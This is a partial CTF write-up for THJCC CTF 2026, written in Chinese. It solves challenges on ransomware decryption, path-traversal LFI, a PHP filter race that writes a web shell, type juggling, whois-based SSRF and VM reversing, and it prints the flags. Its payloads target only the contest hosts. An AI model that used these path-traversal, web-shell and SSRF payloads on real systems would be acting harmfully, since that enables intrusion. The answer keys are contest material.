---
title: THJCC CTF 2026 (部分)
contest: THJCC CTF
year: 2026
difficulty: medium
vuln_type: web_unknown
tags: [powershell-ransomware, aes-cbc, office2john, sstv, ssrf-whois, php-write-race]
attack_chain:
- PowerShell Ransomware: key = MD5(UnixTime) + AES-128-CBC + PKCS7
- header 8 byte unix_time + 16 byte IV + 密文
- 还原脚本：hashlib.md5(str(unix_time).encode())
- flag.txt.lock 拿回 flag.txt
- THJCC{L1nK_R4Ns0mWar3_😭😭😭😭}
- SSTV 解码：Martin M1 + Robot36
- POST n=777 拿 THJCC{LUcKy_sEVen_af41404df16be1ff}
- Apache download.php 路径穿越 ?file=../../../flag.txt
- PHP 文件写入竞争：php://filter/write=convert.iconv.UTF-16LE.UTF-8/
- 多 writer+reader 线程 + 0.67s 内必须访问
- type juggling: 0 == 'admin' 弱类型比较
- login.php 接受 '0' 用户名 → indexController 中 foreach 弱比较通过
- SSRF via whois -h/-p：手工构造 HTTP 请求到 /flag
- TOTP 硬编码密钥 XOR 解码：Jl5cLlcsI10sKCYhLS40IykpMyQnIF8wIjEtPTM6OzI= ^ 'thjcc'
- Custom C++ Reverse: 42 次循环 XOR key=b"Th1s_1s_th3_k3y"
- Custom VM 4 寄存器 11 指令 (1:mov_imm, 2:read_input, 3:mov_reg, 4:add_reg, 5:add_imm, 6:xor_imm, 7:rol, 8:and_imm, 9:cmp_eq)
key_payload: THJCC{L1nK_R4Ns0mWar3_😭😭😭😭}
one_liner: THJCC CTF 2026 多类 (Misc/Crypto/Web/Reverse/Forensics)：勒索软件 AES 解密 + WhoIS SSRF + 竞争写 WebShell + VM 字节码。
lesson: PowerShell 勒索软件使用 MD5(时间戳) 作 key 时，时间窗口可爆破；AES-CBC + 头部保存时间 + IV 是常见 pattern。
quality: high
---
# THJCC CTF 2026 (部分)

## 1. Misc - PowerShell Ransomware
```powershell
$UnixTime = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
$Key = [System.Security.Cryptography.MD5]::Create().ComputeHash(
    [Text.Encoding]::UTF8.GetBytes([string]$UnixTime)
)
$AES = [System.Security.Cryptography.Aes]::Create()
$AES.Mode = CBC; $AES.Padding = PKCS7
$AES.Key = $Key
# 输出: 8 byte unix + 16 byte IV + 密文
```
Python 解密:
```python
import hashlib, struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

with open('flag.txt.lock', 'rb') as f:
    header = f.read(24)
    unix_time = struct.unpack('<q', header[:8])[0]
    iv = header[8:24]
    ciphertext = f.read()

key = hashlib.md5(str(unix_time).encode('utf-8')).digest()
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
# THJCC{L1nK_R4Ns0mWar3_😭😭😭😭}
```

## 2. SSTV
编码 Martin M1 + Robot36:
```bash
curl http://chal.thjcc.org:14514/?n=777 -X POST
# THJCC{LUcKy_sEVen_af41404df16be1ff}
```

## 3. Web LFI
```bash
curl -i "http://chal.thjcc.org:30000/download.php?file=../../../flag.txt"
# THJCC{h0w_dID_y0u_br34k_q'5_pr073c710n???}
```

## 4. PHP 文件写入竞争
```php
$content = $_POST['content'];
$file = $_GET['file'];
$exit = '<?php exit(); ?>';
$blacklist = ['base64', 'rot13', 'string.strip_tags'];
// 写入时前置 $exit，需要绕开
```
利用 `php://filter/write=convert.iconv.UTF-16LE.UTF-8/` 编码 + 多线程竞争（0.67s 内）：
```python
shell_url = base_url + "/shell.php"
file_param = "php://filter/write=convert.iconv.UTF-16LE.UTF-8/resource=/var/www/html/shell.php"
# writer/reader 多线程，直到读到 flag
# THJCC{h4ppy_n3w_y34r_4nd_c0ngr47_u_byp4SS_th7_EXIT_n1ah4wg1n9198w4tqr8926g1n94e92gw65j1n89h21w921g9}
```

## 5. PHP Type Juggling
```php
foreach ($_SESSION['perms'] as $key => $value) {
    if ($key == 'admin') {  // 弱比较
        $is_admin = true;
    }
}
```
- `0 == 'admin'` → true
- login.php 接受 username='0'

## 6. SSRF via whois
```python
# Flask + pyotp TOTP + 硬编码密钥 XOR 编码
# TOTP 密钥: Jl5cLlcsI10sKCYhLS40IykpMyQnIF8wIjEtPTM6OzI= ^ "thjcc"
# SSRF: -h 127.0.0.1 -p 13316 "POST /flag HTTP/1.1\r\n..."
```

## 7. Reverse
- **C++ XOR**: 42 次循环 `c ^ key[i % 15]`，key = `b"Th1s_1s_th3_k3y"`
- **Custom VM**: 411 条 4 字节指令 [opcode, arg1, arg2, arg3]
  - opcode 1: `mov_imm reg, imm`
  - opcode 2: `read_input reg, idx`
  - opcode 3: `mov_reg dst, src`
  - opcode 4: `add_reg dst, src`
  - opcode 5: `add_imm dst, imm`
  - opcode 6: `xor_imm dst, imm`
  - opcode 7: `rol dst, imm`
  - opcode 8: `and_imm dst, imm`
  - opcode 9: `cmp_eq reg, imm` (低 8 位)
